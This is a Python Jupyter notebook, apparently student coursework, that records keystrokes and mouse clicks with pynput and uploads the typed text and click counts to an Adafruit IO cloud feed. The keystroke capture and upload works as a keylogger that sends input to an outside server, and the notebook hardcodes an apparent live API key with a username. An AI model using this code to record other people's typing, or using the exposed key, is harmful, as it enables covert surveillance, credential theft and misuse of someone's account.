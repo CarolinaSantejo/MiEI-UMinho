{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "efd97ce3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "from pynput import mouse\n",
    "import datetime\n",
    "from Adafruit_IO import Client\n",
    "from threading import Thread\n",
    "from time import time, sleep"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b2d20c94",
   "metadata": {},
   "source": [
    "## Save data functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4cf19410",
   "metadata": {},
   "outputs": [],
   "source": [
    "def saveLogs(event, value):\n",
    "    timestamp = get_current_time()\n",
    "    f = open('logger.txt', 'a')\n",
    "    f.write(timestamp + '|' + event + '|' + value + '\\n')\n",
    "    f.close()\n",
    "\n",
    "def get_current_time():\n",
    "    now = datetime.datetime.now()\n",
    "    return now.strftime(\"%Y-%m-%d %H:%M:%S\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9715c6e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "def uploadKeys(cache):\n",
    "    print('Uploading data...')\n",
    "    for key in cache:\n",
    "        aio.send(feedName, key)\n",
    "    cache = ''\n",
    "    print('Uploading sucessfull!')\n",
    "    return cache\n",
    "\n",
    "def uploadWord(word):\n",
    "    print('Word: ' + word)\n",
    "    print('Uploading word...')\n",
    "    aio.send(feedName, word)\n",
    "    word = ''\n",
    "    print('Uploading sucessfull!')\n",
    "    return word"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6b38edfc",
   "metadata": {},
   "source": [
    "## Keyboard functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfb1a8f5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Global variables\n",
    "wordKey = True\n",
    "keycache = ''\n",
    "\n",
    "#detect key press\n",
    "def on_press(key):\n",
    "    try:\n",
    "        global keycache\n",
    "        if wordKey: # Upload by word\n",
    "            keycache = keycache + key.char\n",
    "            if len(keycache) > 20:\n",
    "                keycache = uploadWord(keycache)\n",
    "        else: # Upload by key\n",
    "            keycache = keycache + key.char\n",
    "            if len(keycache) > 10:\n",
    "                keycache = uploadKeys(keycache)\n",
    "                \n",
    "        saveLogs('KeyPressed', key.char)\n",
    "    except AttributeError:\n",
    "        if key == keyboard.Key.space:\n",
    "            keycache = uploadWord(keycache)\n",
    "        \n",
    "\n",
    "#detect key releases\n",
    "def on_release(key):\n",
    "    global keycache\n",
    "    if key == keyboard.Key.esc:\n",
    "        if wordKey: # Upload by word\n",
    "            if len(keycache) > 0:\n",
    "                keycache = uploadWord(keycache)\n",
    "        else: # Upload by key\n",
    "            if len(keycache) <= 10 and keycache != '':\n",
    "                keycache = uploadKeys(keycache)\n",
    "\n",
    "        #stop listener\n",
    "        print('Gracefully Stopping!')\n",
    "        return False\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "67c8b8c3",
   "metadata": {},
   "source": [
    "## Mouse functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8efdb7ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Global variables\n",
    "rightClickCounter = 0\n",
    "leftClickCounter = 0\n",
    "\n",
    "#detect mouse movement\n",
    "def on_move(x, y):\n",
    "    #print('Pointer moved to {0}'.format((x, y)))\n",
    "    pass\n",
    "#detect mouse scroll\n",
    "def on_scroll(x, y, dx, dy):\n",
    "    #print('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))\n",
    "    pass\n",
    "\n",
    "#detect mouse click\n",
    "def on_click(x, y, button, pressed):\n",
    "    global leftClickCounter\n",
    "    global rightClickCounter\n",
    "    if button == mouse.Button.left:\n",
    "        leftClickCounter += 1\n",
    "    elif button == mouse.Button.right:\n",
    "        rightClickCounter += 1\n",
    "    if button == mouse.Button.middle:\n",
    "        #stop listener\n",
    "        print('Gracefully Stopping!')\n",
    "        return False\n",
    "\n",
    "def threaded_function(): # Calcular numero de cliques num intervalo de tempo\n",
    "    global leftClickCounter\n",
    "    global rightClickCounter\n",
    "    print('Aqui')\n",
    "    while(running):\n",
    "        sleep(30)\n",
    "        print('Uploading...')\n",
    "        aio.send('kmdata.leftmouse', leftClickCounter)\n",
    "        aio.send('kmdata.rightmouse', rightClickCounter)\n",
    "        print('Uploading sucessfull!')\n",
    "        rightClickCounter = 0\n",
    "        leftClickCounter = 0\n",
    "        \n",
    "        \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3936faa",
   "metadata": {},
   "source": [
    "# Main"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "46963803",
   "metadata": {},
   "outputs": [],
   "source": [
    "username = 'carolinaSantejo'\n",
    "key = 'aio_DqXa30o4P1DSuPmL9o78J9pUBSl9'\n",
    "feedName = 'kmdata.keyboarddata'\n",
    "\n",
    "aio = Client(username, key)\n",
    "keybMouse = False\n",
    "\n",
    "running = True\n",
    "\n",
    "if keybMouse:\n",
    "    #collect keyboard events\n",
    "    with keyboard.Listener(on_press=on_press, on_release=on_release) as klistener:\n",
    "        klistener.join()\n",
    "else:\n",
    "    #collect mouse events\n",
    "    thread = Thread(target = threaded_function)\n",
    "    thread.start()\n",
    "    with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mlistener:\n",
    "        mlistener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.15"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
